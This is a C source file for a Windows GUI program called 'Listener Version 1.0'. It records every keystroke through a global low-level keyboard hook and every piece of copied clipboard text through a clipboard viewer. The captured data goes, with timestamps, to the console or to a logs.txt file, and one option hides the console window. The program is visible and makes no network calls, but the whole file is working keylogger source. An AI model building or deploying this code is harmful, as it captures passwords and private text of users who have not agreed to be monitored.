#include <stdbool.h>
#include <stdio.h>
#include <time.h>
#include <windows.h>
#define listenClipboardID 0
#define listenKeystrokesID 1
#define writeOnConsoleID 2
#define writeOnFileID 3
#define hideConsoleID 4

bool writeOnConsole = true;
bool writeOnFile = false;
HHOOK hook = 0;

LRESULT CALLBACK keyProc(int nCode, WPARAM wParam, LPARAM lParam) {
	time_t now = time(0);
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) lParam;
	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
		int key = p->vkCode;
		char ch = MapVirtualKeyA(key, MAPVK_VK_TO_CHAR) != 0 ? MapVirtualKeyA(key, MAPVK_VK_TO_CHAR) : key;
		if (writeOnFile) {
		 FILE* file = fopen("logs.txt", "a");
		 fprintf(file, "%s: 0x%X %c\n", strtok(ctime(&now), "\n"), key, ch);
		 fclose(file);
	    }
	    if (writeOnConsole) {
	     printf("%s: 0x%X %c\n", strtok(ctime(&now), "\n"), key, ch);
		}
	}
	return 0;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam) {
    time_t now = time(0);
	switch(Message) {
		
    	case WM_CREATE : {
    		 SetConsoleTitle("Listener Version 1.0 Console");
    		 SetWindowLongA(hwnd, GWL_STYLE, GetWindowLong(hwnd, GWL_STYLE) & ~WS_MAXIMIZEBOX);		 
    	     CreateWindow("BUTTON", "Listen clipboard", WS_VISIBLE | WS_CHILD | BS_CHECKBOX, 10, 10, 160, 25, hwnd, (HMENU) listenClipboardID, NULL, NULL);
    	     CreateWindow("BUTTON", "Listen keystrokes", WS_VISIBLE | WS_CHILD | BS_CHECKBOX, 170, 10, 160, 25, hwnd, (HMENU) listenKeystrokesID, NULL, NULL);
  			 CreateWindow("BUTTON", "Hide console", WS_VISIBLE | WS_CHILD | BS_CHECKBOX, 330, 10, 160, 25, hwnd, (HMENU) hideConsoleID, NULL, NULL);			 
			 CreateWindow("BUTTON", "Write logs on file", WS_VISIBLE | WS_CHILD | BS_CHECKBOX, 10, 40, 160, 25, hwnd, (HMENU) writeOnFileID, NULL, NULL);
 			 CreateWindow("BUTTON", "Write logs on console", WS_VISIBLE | WS_CHILD | BS_CHECKBOX, 170, 40, 160, 25, hwnd, (HMENU) writeOnConsoleID, NULL, NULL);
			 CheckDlgButton(hwnd, writeOnConsoleID, BST_CHECKED);
			 break;
    	}
    	
    	case WM_PAINT: {
             PAINTSTRUCT ps;
             HDC hdc = BeginPaint(hwnd, &ps);
             FillRect(hdc, &ps.rcPaint, (HBRUSH) (COLOR_WINDOW+1));
             EndPaint(hwnd, &ps);
             break;
        }
    	
    	
        case WM_CTLCOLORSTATIC : {
        	 SetBkMode((HDC) wParam, TRANSPARENT);
        	 return (LRESULT) GetStockObject(NULL_BRUSH);
			 break;
		}
		
		case WM_CLOSE : {
			 ChangeClipboardChain(hwnd, NULL);
			 PostQuitMessage(0);
			 break;
		}
		
		case WM_COMMAND : {
		     if(wParam == listenClipboardID) {
		       if(IsDlgButtonChecked(hwnd, listenClipboardID) == BST_UNCHECKED) {
			   	CheckDlgButton(hwnd, listenClipboardID, BST_CHECKED);
			   	SetClipboardViewer(hwnd);
			   }
			   else {
			   	CheckDlgButton(hwnd, listenClipboardID, BST_UNCHECKED);
			   	ChangeClipboardChain(hwnd, NULL);
			   }
			 }
			 if(wParam == listenKeystrokesID) {
		       if(IsDlgButtonChecked(hwnd, listenKeystrokesID) == BST_UNCHECKED) {
			   	CheckDlgButton(hwnd, listenKeystrokesID, BST_CHECKED);
			   	hook = SetWindowsHookEx(WH_KEYBOARD_LL, &keyProc, NULL, 0);
			   }
			   else {
			   	CheckDlgButton(hwnd, listenKeystrokesID, BST_UNCHECKED);
			   	UnhookWindowsHookEx(hook);
			   }
			 }
			 if(wParam == writeOnConsoleID) {
			   if(IsDlgButtonChecked(hwnd, writeOnConsoleID) == BST_UNCHECKED) {
			   	CheckDlgButton(hwnd, writeOnConsoleID, BST_CHECKED);
			   	writeOnConsole = true;
			   }
			   else {
			   	CheckDlgButton(hwnd, writeOnConsoleID, BST_UNCHECKED);
			   	writeOnConsole = false;
			   }
			 }
			 if(wParam == writeOnFileID) {
			   if(IsDlgButtonChecked(hwnd, writeOnFileID) == BST_UNCHECKED) {
			   	CheckDlgButton(hwnd, writeOnFileID, BST_CHECKED);
			   	writeOnFile = true;
			   }
			   else {
			   	CheckDlgButton(hwnd, writeOnFileID, BST_UNCHECKED);
			   	writeOnFile = false;
			   }
			 }
			 if(wParam == hideConsoleID) {
			   if(IsDlgButtonChecked(hwnd, hideConsoleID) == BST_UNCHECKED) {
		        CheckDlgButton(hwnd, hideConsoleID, BST_CHECKED);
		        ShowWindow(GetConsoleWindow(), SW_HIDE);
			   }
			   else {
			   	CheckDlgButton(hwnd, hideConsoleID, BST_UNCHECKED);
		        ShowWindow(GetConsoleWindow(), SW_SHOW);
			   }
			 }
			 break;
		}
		
		 case WM_DRAWCLIPBOARD : {
		 	 if (OpenClipboard(hwnd)) {
               HANDLE clipData = GetClipboardData(CF_TEXT);
               const char* clipText = (const char*) GlobalLock(clipData);
               GlobalUnlock(clipData);
               CloseClipboard();
               if(clipText != NULL) {
               	if(writeOnConsole) {
               	 printf("%s:\n%s\n", strtok(ctime(&now), "\n"), clipText);
				}
                if(writeOnFile) {
                  FILE* file = fopen("logs.txt", "a");
		          fprintf(file, "%s:\n%s\n", strtok(ctime(&now), "\n"), clipText);
		          fclose(file);
			   }
			  }   
             }			
             break; 
		}
			 
		default :
			return DefWindowProc(hwnd, Message, wParam, lParam);
	}
	return 0;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) 
{
	WNDCLASSEX wc = {};
	wc.cbSize = sizeof(WNDCLASSEX);
	wc.lpfnWndProc = WndProc; 
	wc.hInstance = hInstance;
	wc.lpszClassName = "WindowClass";

	if(!RegisterClassEx(&wc)) {
		return 0;
	}

	HWND hwnd = CreateWindowEx(0,"WindowClass","Listener Version 1.0", WS_VISIBLE | WS_OVERLAPPEDWINDOW ^ WS_THICKFRAME, CW_USEDEFAULT, CW_USEDEFAULT, 555, 100, NULL,NULL,hInstance,NULL);
		                        
	if(hwnd == NULL) {
		return 0;
	}
   
	MSG msg = {};
	while(GetMessage(&msg, NULL, 0, 0) > 0) { 
		TranslateMessage(&msg); 
		DispatchMessage(&msg); 
	}
	return 0;
}